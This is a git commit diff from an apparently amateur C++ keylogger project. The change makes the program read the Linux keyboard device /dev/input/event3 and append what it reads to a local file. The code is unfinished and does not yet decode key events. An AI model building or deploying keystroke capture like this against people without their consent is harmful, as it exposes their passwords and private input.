9a646cec06a31403710851f2bb0e3d1a69438564
sophiacarlone <sophiamcar@gmail.com>
2023-03-30 14:41:50 -0400

    must convert event to readable format

--- Keylogger/main.cpp
+++ Keylogger/main.cpp
@@ -18,26 +18,45 @@ find correct index. root privilage?
 
 */
 
+//My computer has keyboard on event 3
+
 #include <iostream>
 #include <fstream>
+#include <linux/input.h> //for input event
+// #include <filesystem> //new library to learn about
 
 using namespace std;
+// using namespace std::filesystem;
 
 int main(){
     ofstream out;
     string filename = "keys_logged.txt";
-    
+    string keyboard_device = "/dev/input/event3";
+    ifstream in;
+
     //this is the file that is logging all the characters. Does it need more information?
+    in.open(keyboard_device);
     out.open(filename);
 
     /*dont need to use threads because people can really only really give one keyboard input at a time
     *even if you try to press at the same time there is a slight difference. */
+
     char c; //character (do it one at a time or can I do something more efficient)
 
+
     while(true){
-        //getting keys
-        c = getchar();
-        if( c == '}') break;
+        in >> c;
         out << c;
-    }
+   }
 }
+
+
+
+//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+    //     //getting keys
+    //     c = getchar();
+    //     out << c;
+    //     if( c == '}') break;
+ 
